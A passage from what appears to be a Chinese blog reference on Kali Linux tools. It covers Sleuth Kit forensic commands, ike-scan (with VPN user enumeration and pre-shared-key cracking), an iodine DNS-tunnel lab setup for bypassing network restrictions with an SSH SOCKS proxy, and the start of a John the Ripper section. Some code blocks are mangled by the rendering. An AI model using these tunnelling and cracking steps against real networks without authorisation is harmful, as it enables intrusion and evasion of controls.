class="hljs-string">&#x27;.001&#x27;</span>结尾的文件），则会自动包含后续的图像段。<br>您还必须指定要查找的内容，并包括以下内容之一：<br>-d data _unit<br>查找已分配给定数据单元（块，集群等）的元数据结构。<br><br>-n file<br>查找给定文件名指向的元数据结构。<br><br>-p par_inode<br>在NTFS映像中查找以给定inode为父节点的未分配MFT条目。 可以与-l和-z一起使用。<br><br>还有几个可选参数:<br>-a<br>查找所有元数据结构（仅在使用data_unit查找时有效）。<br><br>-f fstype<br>指定文件系统类型。 使用“ -f列表”列出支持的文件系统类型。 如果未给出，则使用自动检测方法。<br><br>-l<br>列出使用“ -p”找到的每个文件的详细信息，例如“ fls -l”。<br><br>-i imgtype<br>标识图像文件的类型，例如原始文件。 使用“ -i列表”列出支持的类型。 如果未给出，则使用自动检测方法。<br><br>-b dev_sector_size<br>基础设备扇区的大小（以字节为单位）。 如果未给出，则使用图像格式的值（如果存在）或假定为512字节。<br><br>-v<br>详细输出到stderr。<br><br>-V<br>显示版本信息<br><br>-z ZONE<br>如果给出<span class="hljs-string">&#x27;-p -l&#x27;</span>，这将为正确的时间设置时区。<br><br></code></pre></td></tr></table></figure><p>也是读取磁盘文件的软件</p><h2 id="ike-scan"><a href="#ike-scan" class="headerlink" title="ike-scan"></a>ike-scan</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>ike-scan可以发现IKE主机，也可以使用重传回退模式对它们进行指纹识别。</p><p>ike-scan可以执行以下功能：</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs fortran">•发现确定给定IP范围内的哪些主机正在运行IKE。通过显示那些响应ike-<span class="hljs-built_in">scan</span>发送的IKE请求的主机来完成此操作。<br>•指纹确定主机正在使用哪种IKE实施，并在某些情况下确定主机正在运行的软件的版本。这是通过两种方式完成的：首先是UDP退避指纹识别，它包括记录来自目标主机的IKE响应数据包的时间，并将观察到的重传退避模式与已知模式进行比较；其次是供应商ID指纹识别，该指纹将VPN服务器中的供应商ID负载与已知的供应商ID模式进行比较。<br>•转换枚举查找IKE阶段<span class="hljs-number">1</span>的VPN服务器支持哪些转换属性（例如，加密算法，哈希算法等）。<br>•用户枚举对于某些VPN系统，请发现有效的VPN用户名。<br>•预共享密钥破解通过预共享密钥身份验证为IKE积极模式执行脱机字典或暴力破解密码。它使用ike-<span class="hljs-built_in">scan</span>来获取哈希值和其他参数，并使用psk-crack（这是ike-<span class="hljs-built_in">scan</span>软件包的一部分）来执行破解。<br></code></pre></td></tr></table></figure><p>重传回退指纹识别概念在UDP退回指纹识别纸中进行了更详细的讨论，该文件应作为<a href="https://github.com/royhills/ike-scan/blob/master/udp-backoff-fingerprinting-paper.txt">UDP退回指纹识别纸</a>包含在ike-scan套件中。</p><p>该程序将IKE阶段1（主模式或攻击模式）请求发送到指定的主机，并显示收到的所有响应。它处理带有重发的重试和重传以应对数据包丢失。它还限制了出站IKE数据包使用的带宽量。</p><p>IKE是Internet密钥交换协议，它是IPsec使用的密钥交换和身份验证机制。几乎所有现代VPN系统都实现IPsec，并且绝大多数IPsec VPN使用IKE进行密钥交换。主模式是为IKE交换的第1阶段定义的模式之一（另一种定义的模式是攻击模式）。RFC 2409第5节指定必须实现主模式，因此可以预期所有IKE实现都支持主模式。</p><h3 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs pf">ike-scan [选项] [主机地址...]<br><br>--help或-h显示此使用信息并退出。<br><br> --file = <span class="hljs-variable">&lt;fn&gt;</span>或-f <span class="hljs-variable">&lt;fn&gt;</span>从指定的文件中读取主机名或地址而不是从命令行。一个名字或IP每行地址对标准输入使用“ - ”。<br><br> --sport = <span class="hljs-variable">&lt;p&gt;</span>或-s <span class="hljs-variable">&lt;p&gt;</span>将UDP源端口设置为<span class="hljs-variable">&lt;p&gt;</span>，<span class="hljs-keyword">default</span> = <span class="hljs-number">500</span>，<span class="hljs-number">0</span> = <span class="hljs-keyword">random</span>。<br><br>    一些IKE实现需要客户端使用UDP源端口<span class="hljs-number">500</span>，不会与其他端口通话。请注意，通常需要超级用户权限使用低于<span class="hljs-number">1024</span>的非零源端口系统上的一个进程可以绑定到给定的源端口，在任何一个时间使用--nat-t选项更改，默认源端口为<span class="hljs-number">4500</span><br><br> --dport = <span class="hljs-variable">&lt;p&gt;</span>或-d <span class="hljs-variable">&lt;p&gt;</span>将UDP目标端口设置为<span class="hljs-variable">&lt;p&gt;</span>，<span class="hljs-keyword">default</span> = <span class="hljs-number">500</span>。<br><br>    UDP端口<span class="hljs-number">500</span>是ISAKMP的分配的端口号，这是大多数（如果不是全部）IKE使用的端口实现。使用--nat-t选项更改，默认目标端口为<span class="hljs-number">4500</span><br><br> --retry = <span class="hljs-variable">&lt;n&gt;</span>或-r <span class="hljs-variable">&lt;n&gt;</span>将每个主机的总尝试次数设置为<span class="hljs-variable">&lt;n&gt;</span>，默认= <span class="hljs-number">3</span>。<br><br> --timeout = <span class="hljs-variable">&lt;n&gt;</span>或-t <span class="hljs-variable">&lt;n&gt;</span>将每个主机超时的初始设置设置为<span class="hljs-variable">&lt;n&gt;</span> ms，默认= <span class="hljs-number">500</span>。<br><br>    此超时是发送到每个主机的第一个数据包。随后的超时乘以回退系数设置为--backoff。<br><br> --bandwidth = <span class="hljs-variable">&lt;n&gt;</span>或-B <span class="hljs-variable">&lt;n&gt;</span>将所需的出站带宽设置为<span class="hljs-variable">&lt;n&gt;</span>，默认= <span class="hljs-number">56000</span><br><br>    默认值为每秒位数。如果你将“K”附加到值，则单位是千比特每秒;如果你附“M”值，单位是兆比特每秒。“K”和“M”后缀代表十进制，而不是二进制，倍数。<br><br>    所以<span class="hljs-number">64</span>K是<span class="hljs-number">64000</span>，而不是<span class="hljs-number">65536</span>。<br><br> --interval = <span class="hljs-variable">&lt;n&gt;</span>或-i <span class="hljs-variable">&lt;n&gt;</span>将最小数据包间隔设置为<span class="hljs-variable">&lt;n&gt;</span> ms。<br><br> 分组间隔将不小于此数。指定的时间间隔默认为毫秒。如果“u”附加到该值，则间隔是微秒，如果附加了“s”间隔是秒。如果你想要使用一个给定的带宽，那就是更容易使用--bandwidth选项。您不能同时指--interval和--bandwidth，因为他们只是改变的不同方法相同的底层变量。<br><br> --backoff = <span class="hljs-variable">&lt;b&gt;</span>或-b <span class="hljs-variable">&lt;b&gt;</span>将超时退避因子设置为<span class="hljs-variable">&lt;b&gt;</span>，默认= <span class="hljs-number">1.50</span>。<br><br> 每个主机的超时乘以这个因素每次超时后所以，如果重试的次数是<span class="hljs-number">3</span>，初始的每个主机超时是<span class="hljs-number">500</span>ms和退货因子是<span class="hljs-number">1.5</span>，那么第一个超时就是<span class="hljs-number">500</span>ms，第二个<span class="hljs-number">750</span>ms和第三个<span class="hljs-number">1125</span>ms。<br><br> --verbose或-v显示详细的进度消息<br>  使用多次以获得更大的效果：<br><br>    <span class="hljs-number">1</span> - 显示每个通行证何时完成收到包含无效Cookie的数据包。<br><br>    <span class="hljs-number">2</span> - 显示发送和接收的每个数据包主机从列表中删除。<br><br>    <span class="hljs-number">3</span> - 显示主机，供应商ID和退货清单扫描开始之前。X-<span class="hljs-number">45454545</span> CEEC X-这样打印出较少的协议信息输出线较短。<br><br> - multiline或-M分割多行的有效载荷解码。<br><br> --lifetime = <span class="hljs-variable">&lt;s&gt;</span>或-l <span class="hljs-variable">&lt;s&gt;</span>将IKE生存期设置为秒，默认= <span class="hljs-number">28800</span>。<br><br>  --lifesize = <span class="hljs-variable">&lt;s&gt;</span>或-z <span class="hljs-variable">&lt;s&gt;</span>将IKE生活设置为千字节，默认= <span class="hljs-number">0</span>。<br><br> --auth = <span class="hljs-variable">&lt;n&gt;</span>或-m <span class="hljs-variable">&lt;n&gt;</span>设置身份验证。方法为<span class="hljs-variable">&lt;n&gt;</span>，<span class="hljs-keyword">default</span> = <span class="hljs-number">1</span>（PSK）。<br><br>    RFC定义的值为<span class="hljs-number">1</span>到<span class="hljs-number">5</span>.请参见RFC <span class="hljs-number">2409</span>附录A.检查点混合模式为<span class="hljs-number">64221</span>。GSS（Windows“Kerberos”）为<span class="hljs-number">65001</span>。XAUTH使用<span class="hljs-number">65001</span>到<span class="hljs-number">65010</span>。这不适用于IKEv2。<br><br> --version或-V显示程序版本并退出。<br><br> --vendor = <span class="hljs-variable">&lt;v&gt;</span>或-e <span class="hljs-variable">&lt;v&gt;</span>将供应商ID字符串设置为十六进制值<span class="hljs-variable">&lt;v&gt;</span>。 <br></code></pre></td></tr></table></figure><h3 id="主机输入和内存要求"><a href="#主机输入和内存要求" class="headerlink" title="主机输入和内存要求"></a>主机输入和内存要求</h3><p>可以在命令行上指定要扫描的主机，也可以使用该<code>--file=&lt;fn&gt;</code>选项从输入文件中读取。该程序可以处理大量主机，而这些主机仅受存储host_entry结构列表所需的内存量限制。在32位系统上，每个host_entry结构都需要45字节，因此B类网络（65534台主机）将需要大约2.8 MB的列表空间。可以将主机指定为IP地址或主机名，但是该程序会将所有主机内部存储为IP地址，并且只会在输出中显示IP地址（ike-scan调用gethostbyname（3）以确定每个主机的IP地址，但这可以通过<code>--nodns</code>选项禁用）。</p><h3 id="限速"><a href="#限速" class="headerlink" title="限速"></a>限速</h3><p>该程序限制了它发送IKE数据包的速率，以确保它不会使网络连接过载。默认情况下，它使用每秒56000位的出站数据速率。可以使用该<code>--bandwidth</code>选项进行更改。</p><p>如果要以特定速率发送数据包，则可以使用该<code>--interval</code>选项。</p><h3 id="Cookie生成和远程主机识别"><a href="#Cookie生成和远程主机识别" class="headerlink" title="Cookie生成和远程主机识别"></a>Cookie生成和远程主机识别</h3><p>ike-scan为每个主机生成唯一的IKE cookie，并使用这些cookie来确定响应数据包属于哪个主机。请注意，它不依赖于响应数据包的源IP地址，因为响应数据包可能是从与原始发送地址不同的IP地址发送的。有关此示例，请参见“程序输出”部分。</p><p>通过获取gettimeofday（）返回的当前时间的MD5哈希值的前64位（以秒和微秒为单位），唯一的主机号和主机IP地址来生成cookie。这样可以确保cookie具有合理确定性的唯一性。</p><p>如果<code>--verbose</code>有效，则收到的任何与cookie不匹配的数据包都将产生如下消息：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Ignoring</span> <span class="hljs-number">84</span> bytes from <span class="hljs-number">172.16.2.2</span> with unknown cookie <span class="hljs-number">195</span>c837e5a39f657<br></code></pre></td></tr></table></figure><p>如果<code>--verbose</code>未生效，则将忽略这些数据包。</p><p>此类Cookie不匹配的原因可能是：</p><ul><li>主机仍在向先前的ike-scan运行返回IKE响应。</li><li>该数据包不是IKE数据包，或已以某种方式损坏。要么</li><li>已收到与ike-scan无关的IKE数据包。</li></ul><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>以下示例将对单个主机172.16.2.2运行IKE检测。不会进行退避指纹识别，并且所有选项（超时，重试，变换集等）将是默认选项。</p><ul><li>&#96;&#96;&#96;<br>ike-scan 172.16.2.2<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>这将从文件“ hostlist.txt”中读取目标主机。<br><br>- ```<br>  ike-scan --file=hostlist.txt<br></code></pre></td></tr></table></figure></li></ul><p>这将从标准输入中读取主机，并执行IKE检测和退避指纹识别。退避等待时间指定为20秒。</p><ul><li>&#96;&#96;&#96;<br>cat hostlist.txt | ike-scan –file&#x3D;- –showbackoff&#x3D;20<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns"><br>这将对<span class="hljs-number">172.16.0.0</span>/<span class="hljs-number">16</span>指定的网络中的所有主机（包括网络和广播地址）运行ike-scan。在这种情况下，这将导致总共扫描<span class="hljs-number">65536</span>台主机-从<span class="hljs-number">172.16.0.0</span>到<span class="hljs-number">172.16.255.255</span>（含）。<br><br>- ```<br>  ike-scan <span class="hljs-number">172.16.0.0</span>/<span class="hljs-number">16</span><br></code></pre></td></tr></table></figure></li></ul><p>这使用范围表示法来扫描从172.16.0.0到172.16.255.255（含）之间的总共65536台主机。</p><ul><li>&#96;&#96;&#96;<br>ike-scan 172.16.0.0-172.16.255.255<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br><br><br>## ils-sleuthkit(未知)<br><br>## img_cat<br><br>### 描述：<br><br>输出图像文件的内容。<br>  img_cat输出图像文件的内容。 非原始图像文件将具有嵌入的数据和[元数据](https:<span class="hljs-comment">//so.csdn.net/so/search?q=元数据&amp;spm=1001.2101.3001.7020)。 img_cat将仅输出数据。 这使您可以将嵌入格式转换为原始格式，或者通过将输出传递到适当的工具来计算数据的MD5哈希值。</span><br><br>### 参数：<br><br>```bash<br>-i imgtype<br>标识图像文件的类型，例如raw或aff。 使用“ -i列表”列出支持的类型。 如果未给出，则使用自动检测方法。<br><br>-b dev_sector_size<br>基础设备扇区的大小（以字节为单位）。 如果未给出，则使用图像格式的值（如果存在）或假定为<span class="hljs-number">512</span>字节。<br><br>-s start_sector<br>起始的扇区号。<br><br>-e stop_sector<br>要停止的扇区号。<br><br>-v<br>将调试语句的详细输出输出到stderr<br><br>-V<br>显示版本信息<br><br>image [images]<br>要读取的磁盘或分区映像，其格式以“ -i”给出。 如果将图像分为多个段，则可以指定多个图像文件名。 如果仅给出一个图像文件，并且其名称是序列中的第一个图像文件（例如，以<span class="hljs-string">&#x27;.001&#x27;</span>结尾的文件），则会自动包含后续的图像段。<br><br></code></pre></td></tr></table></figure></li></ul><h2 id="img-stat"><a href="#img-stat" class="headerlink" title="img_stat"></a>img_stat</h2><h3 id="描述：-10"><a href="#描述：-10" class="headerlink" title="描述："></a>描述：</h3><p> 显示图像文件的详细信息。<br>  img_stat显示与图像文件关联的详细信息。 此命令的输出特定于图像格式。 对于分割图像格式，将至少给出大小，并给出每个文件的字节范围。</p><h3 id="参数：-5"><a href="#参数：-5" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">-i imgtype<br>标识图像文件的类型，例如原始文件。 使用“ -i列表”列出支持的类型。 如果未给出，则使用自动检测方法。<br><br>-b dev_sector_size<br>基础设备扇区的大小（以字节为单位）。 如果未给出，则使用图像格式的值（如果存在）或假定为512字节。<br><br>-t<br>仅打印图像类型。<br><br>-v<br>将调试语句的详细输出输出到stderr<br><br>-V<br>显示版本信息<br><br>image [images]<br>要读取的磁盘或分区映像，其格式以“ -i”给出。 如果将图像分为多个段，则可以指定多个图像文件名。 如果仅给出一个图像文件，并且其名称是序列中的第一个图像文件（例如，以<span class="hljs-string">&#x27;.001&#x27;</span>结尾的文件），则会自动包含后续的图像段。<br><br></code></pre></td></tr></table></figure><p>img开头的都是扫磁盘的</p><h2 id="iodine"><a href="#iodine" class="headerlink" title="iodine"></a>iodine</h2><p>在受限制的网络中，如果DNS请求没有被限制，就可以通过DNS请求建立隧道而突破网络限制。iodine是Kali Linux提供的一款DNS隧道工具。该工具分为服务器端iodined和客户端iodine。服务器端iodined提供特定域名的DNS解析服务。当客户端请求该域名的解析，就可以建立隧道连接。该工具不仅可以提供高性能的网络隧道，还能提供额外的安全保证。渗透测试人员可以设置服务的访问密码，来保证该服务不被滥用。</p><p>优点</p><ul><li>对下行数据不进行编码，因此性能优</li><li>支持多平台：Linux、BSD、Mac OS、Windows</li><li>最大16个并发链接</li><li>强制密码支持</li><li>支持同网段隧道IP（不同于服务器、客户端网段）</li><li>支持多种 DNS 记录类型</li><li>丰富的隧道质量检测措施</li></ul><h4 id="防火墙：m0n0wall"><a href="#防火墙：m0n0wall" class="headerlink" title="防火墙：m0n0wall"></a>防火墙：m0n0wall</h4><p>桥接模式<br>IP：192.168.1.10</p><h4 id="DNS服务器：win2003"><a href="#DNS服务器：win2003" class="headerlink" title="DNS服务器：win2003"></a>DNS服务器：win2003</h4><p>桥接模式<br>IP：192.168.1.124</p><h4 id="本地DNS服务器：LAN-DNS"><a href="#本地DNS服务器：LAN-DNS" class="headerlink" title="本地DNS服务器：LAN_DNS"></a>本地DNS服务器：LAN_DNS</h4><p>hostonly:1.1.1.111</p><h4 id="服务器：kali"><a href="#服务器：kali" class="headerlink" title="服务器：kali"></a>服务器：<a href="https://so.csdn.net/so/search?q=kali&spm=1001.2101.3001.7020">kali</a></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">iodined -f -c 10.0.0.1 test.lab.com<br><span class="hljs-comment">#-f：前段显示（可选）</span><br><span class="hljs-comment">#-c：检查客户端地址（可选）</span><br><span class="hljs-comment">#IP：服务器端的隧道IP地址（不同于服务器主机IP和客户端主机IP，此IP仅用于隧道之间，在隧道的两道构成独立的网段）</span><br>Enter password:pass123 <span class="hljs-comment">#设置隧道密码</span><br>ifconfig <span class="hljs-comment">#发现多了一块网卡（新建的虚拟网卡，隧道独立使用的网段）</span><br></code></pre></td></tr></table></figure><h4 id="客户端：ubantu"><a href="#客户端：ubantu" class="headerlink" title="客户端：ubantu"></a>客户端：ubantu</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">iodine -f 10.0.0.2 test.lab.com<br><span class="hljs-comment">#IP：局域网内部本地DNS服务器IP（可以不设置让他自己找）</span><br>Enter password: pass123 <span class="hljs-comment">##设置隧道密码</span><br>ifconfig <span class="hljs-comment">#发现多了一块网卡（新建的虚拟网卡，隧道独立使用的网段）</span><br><span class="hljs-comment">#嵌套隧道</span><br>ssh -fgCN -D 7001 root@10.0.0.1<br></code></pre></td></tr></table></figure><h2 id="istat"><a href="#istat" class="headerlink" title="istat"></a>istat</h2><p><strong>描述：</strong></p><p>  显示<a href="https://so.csdn.net/so/search?q=%E5%85%83%E6%95%B0%E6%8D%AE&spm=1001.2101.3001.7020">元数据</a>结构的详细信息（即inode）。<br>  istat显示uid，gid，模式，大小，链接号，修改，访问，更改的时间以及结构已分配的所有磁盘单元。</p><p><strong>选项如下：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">-B num<br>显示num个磁盘单元的地址。 在未分配大小为0的inode但仍具有块指针时很有用。<br><br>-f fstype<br>指定文件系统类型。 使用“ -f列表”列出支持的文件系统类型。 如果未给出，则使用自动检测方法。<br><br>-s seconds<br>原始系统的时间偏差（以秒为单位）。 例如，如果原始系统的速度慢了100秒，则该值为-100。<br><br>-i imgtype<br>标识图像文件的类型，例如原始文件。 使用“ -i列表”列出支持的类型。 如果未给出，则使用自动检测方法。<br><br>-o imgoffset<br>文件系统在映像中开始的扇区偏移量。<br><br>-b dev_sector_size<br>基础设备扇区的大小（以字节为单位）。 如果未给出，则使用图像格式的值（如果存在）或假定为512字节。<br><br>-v<br>将调试语句的详细输出输出到stderr<br><br>-V<br>显示版本号<br><br>-z zone<br>原始系统时区的ASCII字符串。 例如，EST5EDT或GMT。 这些字符串由操作系统定义，并且可能会有所不同。 注意：自TCTUTILs以来，这种情况已更改。<br><br>image [images]<br>要读取的磁盘或分区映像，其格式以“ -i”给出。 如果将图像分为多个段，则可以指定多个图像文件名。 如果仅给出一个图像文件，并且其名称是序列中的第一个文件（例如，以<span class="hljs-string">&#x27;.001&#x27;</span>结尾的指示），则后续的图像段将自动包含在内。索引节点元数据编号以显示统计信息。<br><br></code></pre></td></tr></table></figure><h1 id="j"><a href="#j" class="headerlink" title="j"></a>j</h1><h2 id="jcat"><a href="#jcat" class="headerlink" title="jcat"></a>jcat</h2><h3 id="描述：-11"><a href="#描述：-11" class="headerlink" title="描述："></a>描述：</h3><p>在文件系统日志中显示块的内容。<br>  jcat显示文件系统日志中日志块的内容。可以指定日志的inode地址或使用默认位置。 请注意，块地址是日记块地址，而不是文件系统块。 原始输出提供给STDOUT。</p><h3 id="参数：-6"><a href="#参数：-6" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">-f fstype<br>指定文件系统类型。 使用“ -f列表”列出支持的文件系统类型。 如果未给出，则使用自动检测方法。<br><br>-i imgtype<br>标识图像文件的类型，例如原始文件。 使用“ -i列表”列出支持的类型。 如果未给出，则使用自动检测方法。<br><br>-o imgoffset<br>文件系统在映像中开始的扇区偏移量。<br><br>-b dev_sector_size<br>基础设备扇区的大小（以字节为单位）。 如果未给出，则使用图像格式的值（如果存在）或假定为512字节。<br><br>-V<br>显示版本信息<br><br>-v<br>详细输出<br><br>image [images]<br>要读取的磁盘或分区映像，其格式以“ -i”给出。 如果图像是分为多个部分。 如果仅给出一个图像文件，并且其名称是序列中的第一个图像文件（例如，以<span class="hljs-string">&#x27;.001&#x27;</span>结尾的文件），则后续的图像段将自动包含在内。<br><br>[inode]<br>可以在其中找到文件系统日志的索引节点。<br><br>jblk<br>要显示的日志块。<br></code></pre></td></tr></table></figure><h2 id="jls"><a href="#jls" class="headerlink" title="jls"></a>jls</h2><h3 id="描述：-12"><a href="#描述：-12" class="headerlink" title="描述："></a>描述：</h3><p>列出文件系统日志的内容。<br>  jls列出文件系统日志中的记录和条目。 如果给出了inode，则它将在那里查找日志。 否则，它将使用默认位置。 输出列出了日记帐编号和描述。</p><h3 id="参数：-7"><a href="#参数：-7" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">-f fstype<br>指定文件系统类型。 使用“ -f列表”列出支持的文件系统类型。 如果未给出，则使用自动检测方法。<br><br>-i imgtype<br>标识图像文件的类型，例如原始或拆分。 使用“ -i列表”列出支持的类型。 如果未给出，则使用自动检测方法。<br><br>-o imgoffset<br>文件系统在映像中开始的扇区偏移量。<br><br>-b dev_sector_size<br>基础设备扇区的大小（以字节为单位）。 如果未给出，则使用图像格式的值（如果存在）或假定为512字节。<br><br>-V<br>显示版本信息<br><br>-v<br>详细输出<br><br>image [images]<br>一个（或多个，如果已拆分）磁盘或分区映像，其格式以“ -i”给出。<br><br>[inode]<br>可以在其中找到文件系统日志的索引节点。<br></code></pre></td></tr></table></figure><h2 id="john"><a href="#john" class="headerlink" title="john"></a>john</h2><h3 id="描述：-13"><a href="#描述：-13" class="headerlink" title="描述："></a>描述：</h3><p><code>John the Ripper</code> 是一款大受欢迎的、免费的开源软件。也是一个基于字典的快速破解密码的工具，是一款用于在已知密文的情况下尝试破解出明文的破解密码软件，支持目前大多数的<a href="https://so.csdn.net/so/search?q=%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">加密</a>算法，如 <code>DES</code> 、 <code>MD4</code> 、 <code>MD5</code> 等。 <code>John the Ripper</code> 支持字典破解方式和暴力破解方式。它支持多种不同类型的系统架构，包括 <code>Unix</code> 、 <code>Linux</code> 、 <code>Windows</code> 、 <code>DOS</code> 模式、 <code>BeOS</code> 和 <code>OpenVMS</code> ，主要目的是破解不够牢固的 <code>Unix/Linux</code> 系统密码。</p><h3 id="参数：-8"><a href="#参数：-8" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs bash">选 项<br><br>描 